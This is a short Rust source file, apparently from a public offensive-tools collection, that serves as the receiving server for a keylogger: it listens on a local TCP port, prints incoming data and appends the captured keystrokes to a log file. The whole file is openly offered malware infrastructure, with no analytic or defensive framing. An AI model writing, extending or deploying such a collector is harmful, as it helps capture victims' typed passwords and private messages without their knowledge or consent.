
/*
    TCP RECEIVER FOR KEYLOGGER
    For more codes: 
    @5mukx
*/

#![allow(unused_imports)]
use std::io::{self, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::fs::{File, OpenOptions};
use std::thread;

fn handle_client(mut stream: TcpStream) -> io::Result<()> {
    let mut buffer = Vec::new();
    stream.read_to_end(&mut buffer)?;

    println!("Received data:");
    println!("{}", String::from_utf8_lossy(&buffer));

    let mut file = OpenOptions::new().create(true).append(true).open("keylog_tcp.txt")?;
    file.write_all(&buffer)?;

    Ok(())
}

fn main() -> io::Result<()> {
    let listener = TcpListener::bind("127.0.0.1:6969")?;
    println!("Keylogger Receiver");
    println!("Receiver listening on {:?}", listener.local_addr());

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                thread::spawn(move || {
                    if let Err(err) = handle_client(stream) {
                        eprintln!("Error while handling client: {}", err);
                    }
                });
            }
            Err(e) => {
                eprintln!("Error accepting connection: {}", e);
            }
        }
    }

    Ok(())
}
